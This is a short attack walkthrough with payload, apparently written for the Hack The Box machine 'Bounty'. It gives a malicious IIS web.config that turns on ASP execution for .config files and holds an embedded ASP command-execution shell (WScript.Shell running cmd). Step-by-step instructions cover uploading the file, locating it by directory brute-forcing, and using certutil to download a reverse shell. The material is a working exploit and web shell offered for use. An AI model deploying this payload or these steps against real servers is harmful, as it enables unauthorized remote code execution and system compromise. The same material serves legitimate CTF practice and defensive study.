**You need a option on the webserver that allows you to upload files**
**Step 1: Copy code starting from line 7 and paste it into a file named web.config**
**Step 2: Now Upload this web.config file**
**Step 3: Once file is uploaded access the web.config file  http://$IP/uploads/web.config ( You will have to directory bruteforce to find where files are uplaoded )**
**Step 4: Now Check the Source Code and you should get the results based on command you specified in line 28**

<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c whoami")
o = cmd.StdOut.Readall()
Response.Write(o)
%>
-->

<!-- Change Line 22 to execute a command -->
<!--Step 1: Run Whoami and check the source code -->
<!--Step 2: Find the users writebale directory mkdir command can help-->
<!--Step 3: Download the reverse shell  cmd /c certutil.exe -urlcache -f  -->

<!-- Hack The Box = Bounty -->
